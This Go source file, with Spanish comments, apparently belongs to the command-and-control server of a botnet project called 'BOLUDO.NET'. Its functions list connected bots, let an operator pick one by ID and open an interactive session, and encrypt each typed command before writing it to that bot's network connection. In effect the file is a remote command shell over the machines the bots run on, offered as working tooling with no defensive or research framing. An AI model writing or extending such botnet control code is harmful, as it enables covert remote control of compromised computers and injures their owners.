// Package nets proporciona funciones para interactuar con bots.
package nets

import (
	"bufio"
	"fmt"
	"log"
	"os"
	"strings"

	"BOLUDO.NET/config"
	"BOLUDO.NET/seguridad"
	"BOLUDO.NET/util"
)

// ReplBOT establece una sesión interactiva con un bot seleccionado por ID.
// Muestra un prompt para ingresar el ID del bot. El ID 9999 se usa para salir.
func ReplBOT() {
	var (
		ID      int
		Input   string
		ReplBOT bool = false
	)

	util.LimpiarConsola()
	Listar()

	fmt.Print("\nIngrese el ID del BOT (9999 para salir): ")
	fmt.Scan(&ID)
	fmt.Scanln()
	if CheckBOT(ID) {
		util.LimpiarConsola()
		fmt.Printf("Sesión establecida: %s\n", config.BOT[ID].RemoteAddr())
		Lector := bufio.NewReader(os.Stdin)
		for !ReplBOT {
			fmt.Printf("(%s)> ", config.BOT[ID].RemoteAddr())
			Input, _ = Lector.ReadString('\n')
			Input = Input[:len(Input)-1]
			Input = strings.TrimSpace(Input)
			if Input == "exit" {
				ReplBOT = true
				util.LimpiarConsola()
			} else {
				Enviar(ID, Input)
			}
		}
	} else if ID == 9999 {
		// Salir del bucle
	} else {
		fmt.Println("ID de BOT no válido.")
	}
}

// Enviar envía un mensaje encriptado al bot con el ID especificado.
// Si hay un error al encriptar o enviar el mensaje, se registra un error.
func Enviar(ID int, InputSend string) {
	// Encriptar el mensaje
	InputEncrypt, err := seguridad.Encryptar(InputSend)
	if err != nil {
		log.Fatalf("[!] ERROR AL ENCRIPTAR: %s", err.Error())
	}

	if CheckBOT(ID) {
		BOT := config.BOT[ID]
		_, err := BOT.Write([]byte(InputEncrypt))
		if err != nil {
			log.Fatalf("[!] ERROR AL ENVIAR (Sección Write): %s", err.Error())
		}
	} else {
		log.Printf("[!] BOT con ID %d no válido o desconectado.", ID)
	}
}
